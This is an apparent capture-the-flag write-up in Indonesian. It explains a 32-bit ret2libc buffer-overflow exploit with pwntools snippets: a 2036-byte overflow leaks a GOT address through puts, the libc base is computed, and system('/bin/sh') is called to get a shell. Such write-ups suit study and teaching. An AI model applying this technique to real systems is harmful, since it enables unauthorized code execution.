Sama seperti soal sebelumnya disini kita bisa menggunakan teknik `ret2libc` namun bedanya disini kita telah mendapatkan file libc dan linkernya, jadi tidak perlu repot mencari di libc database, 
namun tetap perlu leak got karena untuk leak libc base address

1. Leak libc base dengan menggunakan control EIP untuk `puts@plt` leak got . Disini kita bisa buffer dengan `2036` bytes 
```py
    p=b"A"*2036
    p+=p32(exe.plt["puts"])
    p+=p32(exe.sym["main"])
    p+=p32(exe.got[func_name]) #argument
```
2. Dari leaked got address diatas bisa kita kurangi dengan address dari libcnya
```py
libc.address = leak("puts") - libc.sym["puts"]
```
4. Setelah semua kita dapatkan kita bisa membuat payload seperti ini
```py
    BINSH=next(libc.search(b"/bin/sh"))
    SYSTEM=libc.sym["system"]
    p=b"A"*2036
    p+=p32(SYSTEM) # target function
    p+=p32(exe.sym["main"]) # return function ke main
    p+=p32(BINSH) # argument string untuk system()
    io.sendline(p)
``` 
Karena disini menggunakan arsitektur 32-bits maka tidak perlu gadget untuk passing argument